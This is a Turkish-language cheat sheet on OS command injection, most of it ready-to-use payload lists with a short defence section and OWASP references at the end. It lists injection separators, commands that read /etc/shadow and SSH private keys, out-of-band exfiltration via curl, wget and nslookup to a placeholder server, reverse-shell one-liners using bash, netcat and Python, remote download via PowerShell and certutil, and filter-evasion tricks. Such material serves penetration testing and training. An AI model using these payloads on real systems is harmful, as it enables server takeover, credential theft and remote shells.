# 03 - Komut Enjeksiyonu (OS Command Injection)

> Uygulamanın kullanıcı girdisini işletim sistemi komutuna eklemesiyle, saldırganın sunucuda komut çalıştırabildiği zafiyet.

## Zafiyet Nedir?

Uygulama kullanıcı girdisini bir shell komutuna (`system()`, `exec()`, `popen()`, backtick) birleştirdiğinde saldırgan ek komut enjekte edebilir. Etki genellikle en yüksek seviyededir: uzaktan kod çalıştırma (RCE), sunucuyu tam ele geçirme.

## Tespit

```bash
; id
| id
& whoami
`id`
$(id)
```

Görünür çıktı yoksa zaman tabanlı:

```bash
; sleep 10
| ping -c 10 127.0.0.1
```

## Payload'lar

### Komut ayırıcıları (Linux)

```bash
; komut          bir öncekinden bağımsız çalıştır
| komut          çıktıyı pipe et
|| komut         önceki başarısızsa çalıştır
& komut          arka planda / ayır
&& komut         önceki başarılıysa çalıştır
`komut`          komut ikamesi
$(komut)         komut ikamesi
%0a komut        yeni satır (URL-encoded)
%0d komut        satır başı
komut1 && komut2
> /dev/null; komut
```

### Bilgi toplama

```bash
; id
; whoami
; uname -a
; hostname
; cat /etc/passwd
; cat /etc/shadow
; ls -la /
; pwd
; ip a
; ifconfig
; env
; ps aux
; netstat -tulpn
; cat ~/.ssh/id_rsa
; cat /var/www/html/config.php
```

### Girdi bir argümanın ortasındaysa

Örn. `ping <girdi>`:

```bash
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 & id
127.0.0.1 && id
127.0.0.1 || id
127.0.0.1 `id`
127.0.0.1 $(id)
127.0.0.1 %0a id
-la /etc         (argüman enjeksiyonu)
```

### Windows

```cmd
& whoami
| whoami
&& whoami
|| whoami
& ipconfig
& systeminfo
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& dir C:\
& net user
& tasklist
& ping -n 10 127.0.0.1
```

### PowerShell

```powershell
; Get-Content C:\gizli.txt
; whoami
; Get-Process
; (New-Object Net.WebClient).DownloadString('http://SUNUCU/a')
```

### Kör (blind) - zaman tabanlı

```bash
; sleep 10
`sleep 10`
$(sleep 10)
| ping -c 10 127.0.0.1
& timeout 10          (Windows)
& ping -n 10 127.0.0.1 (Windows)
; python3 -c "import time;time.sleep(10)"
```

### Kör - out-of-band (DNS/HTTP)

```bash
; nslookup `whoami`.SUNUCU.oastify.com
; nslookup $(whoami).SUNUCU
; curl http://SUNUCU/?d=$(id | base64)
; wget http://SUNUCU/$(whoami)
; ping -c1 `whoami`.SUNUCU
& nslookup SUNUCU        (Windows)
& certutil -urlcache -f http://SUNUCU/a a (Windows)
```

### Ters kabuk (reverse shell) örnekleri

```bash
; bash -i >& /dev/tcp/SUNUCU/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/SUNUCU/4444 0>&1'
; nc -e /bin/sh SUNUCU 4444
; nc SUNUCU 4444 -e /bin/bash
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SUNUCU 4444 >/tmp/f
; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("SUNUCU",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'
```

## Filtre / WAF Atlatma

### Boşluk filtreleniyorsa

```bash
cat</etc/passwd
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat%09/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
IFS=,;`cat<<<uname,-a`
```

### Anahtar kelime / karakter filtresi

```bash
c'a't /et'c'/pa'ss'wd
w"h"o"a"m"i
c\at /et\c/pa\sswd
/???/??t /???/p?ss??
who$@ami
who''ami
a=who;b=ami;$a$b
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
$(printf '\x63\x61\x74') /etc/passwd
```

### Kara listelenmiş komuta eşdeğerler

```bash
tac /etc/passwd
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
nl /etc/passwd
xxd /etc/passwd
od -c /etc/passwd
sort /etc/passwd
grep "" /etc/passwd
```

### Windows atlatma

```cmd
who^ami
w"h"oami
c:\wind*\system32\cmd.exe
set x=who&set y=ami&call %x%%y%
powershell -enc <base64>
```

## Korunma

1. Shell'i tamamen atla: OS komutu çağırmak yerine dil/kütüphane fonksiyonunu kullan (dosya kopyalamak için `shutil.copy`, DNS için kütüphane API'si).
2. Argümanları dizi olarak geçir (shell=False):
   ```python
   # Tehlikeli
   os.system("ping " + host)
   # Güvenli
   subprocess.run(["ping", "-c", "1", host], shell=False)
   ```
3. Katı allow-list doğrulama: Örn. yalnızca geçerli IP/hostname regex'i; `; | & $ \` \n` gibi metakarakterleri reddet.
4. En az yetki: Düşük yetkili kullanıcı, sandbox/konteyner izolasyonu.
5. Kullanıcı girdisi mümkünse komut satırına hiç ulaşmasın.

## Kaynaklar

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PortSwigger - OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
